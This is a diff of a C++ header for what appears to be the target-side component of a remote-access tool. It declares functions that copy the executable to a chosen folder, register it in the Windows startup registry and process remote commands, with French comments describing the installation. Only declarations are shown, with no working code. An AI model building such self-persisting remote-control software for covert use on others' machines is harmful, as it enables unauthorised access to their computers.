@@ -1,6 +1,6 @@
 //
-// Created by Berlingot on 2023-04-20.
-//
+// Ce fichier contient tous les élément permettant l'initialisation du logiciel
+// Permet l'installation du service et de mettre à un endroit spécifique dans l'ordinateur
 
 #ifndef SERVEUR___CIBLE_INSTALLATIONANDSTART_H
 #define SERVEUR___CIBLE_INSTALLATIONANDSTART_H
@@ -23,16 +23,24 @@
 #include "CMD.h"
 #include "Utility.h"
 class installationAndStart {
+private:
+protected:
 public:
-    //variables
-    static std::string CurrentPath;			//current path of executable
-    static std::string installationFolder;		//path of folder it should be installed to
-    static std::string installationPath;			//full path where executable should be installed to
-    static bool installing;			//bool - defines whether the file is currently being installed (and should be terminated after the initiation sequence,
+    static bool regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName);
 
-    static bool locationSet();	//installation path
-    static bool startupSet();	//demarrage path
-    static bool installed();	//installation dans le path
+    static std::string processCommand(std::string command);
+    static void handleError(int errType, bool errSevere);
+    static OperationState init();
+
+    //variables
+    static std::string CurrentPath;
+    static std::string installationFolder;
+    static std::string installationPath;
+    static bool installing;
+
+    static bool locationSet();
+    static bool startupSet();
+    static bool envoiedexecutable();
     static bool directoryExists(const char* dirName);
 
     static bool processParameter(std::string &command, std::string compCommand);
@@ -45,21 +53,11 @@ public:
 
     static void runInstalled();
 
-    static void startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments);		//starts a process
+    static void startProcess(LPCTSTR lpApplicationName, LPTSTR lpArguments);
 
-    static bool setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args);	//registers a program in startup with supplied name, path to exe and startup arguments
+    static bool setStartup(PCWSTR pszAppName, PCWSTR pathToExe, PCWSTR args);
 
-    static bool regValueExists(HKEY hKey, LPCSTR keyPath, LPCSTR valueName);	//checks if a certain value exists in the registry
 
-    static std::string processCommand(std::string command);		//processes command
-
-    static void handleError(int errType, bool errSevere);							//handles errors
-
-    //instead of proceeding to the main loop)
-    //static LPTSTR lpArguments;
-
-    //Fonctions
-    static OperationState init();
 
 };
 
